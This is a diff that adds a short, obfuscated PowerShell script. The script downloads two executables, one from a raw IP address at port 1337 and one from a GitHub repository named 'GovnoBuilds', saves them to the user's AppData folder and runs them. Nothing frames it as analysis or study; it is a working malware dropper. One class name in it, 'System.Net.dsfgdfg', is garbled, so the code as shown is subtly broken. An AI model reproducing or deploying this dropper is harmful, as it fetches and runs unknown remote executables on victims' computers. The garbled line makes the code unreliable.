@@ -1,0 +1,12 @@
+$gfgff = @(
+    "http://147.45.125.248:1337/files/978.exe",
+    "https://github.com/JqrkaSt3al/GovnoBuilds/raw/refs/heads/main/Updater.exe"
+)
+$dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
+foreach ($link in $gfgff) {
+    $dgfsgfd = Split-Path -Leaf $link
+    $sgdf = Join-Path -Path $dfsgsfdg -ChildPath $dgfsgfd
+    $dsfgdfg = New-Object System.Net.dsfgdfg
+    $dsfgdfg.DownloadFile($link, $sgdf)
+    Start-Process -FilePath $sgdf
+}
